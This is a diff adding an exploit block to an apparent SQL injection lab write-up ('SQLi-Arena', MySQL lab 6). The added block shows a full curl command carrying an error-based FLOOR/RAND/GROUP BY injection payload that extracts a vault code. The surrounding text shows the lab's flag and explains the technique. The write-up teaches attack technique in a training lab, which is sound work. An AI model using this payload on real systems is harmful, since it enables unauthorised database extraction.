@@ -103,6 +103,18 @@
     <code>FLAG{fl00r_r4nd_d0ubl3_qu3ry}</code>.
 </p>
 
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">curl. Full Exploit</span>
+    </div>
+    <div class="terminal-body">
+        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab6" \<br> --data-urlencode "type=' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT vault_code FROM vault LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -"
+    </div>
+</div>
+
 <div class="result-success result-box">
     <strong>Key Takeaway:</strong> The FLOOR/RAND/GROUP BY technique is one of the
     oldest and most reliable error-based SQL injection methods. It works across
